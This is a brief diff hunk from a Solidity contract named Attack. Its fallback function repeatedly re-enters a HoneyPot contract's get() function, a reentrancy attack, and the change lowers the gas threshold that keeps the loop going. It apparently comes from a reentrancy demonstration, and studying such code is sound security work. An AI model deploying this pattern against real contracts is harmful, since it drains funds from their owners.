@@ -16,7 +16,7 @@ contract Attack{
 
     function () public payable{
         
-        if(msg.sender.balance >= msg.value && gasleft() >= 3000000)
+        if(msg.sender.balance >= msg.value && gasleft() >= 20000)
             HoneyPot(msg.sender).get();
     }
 }
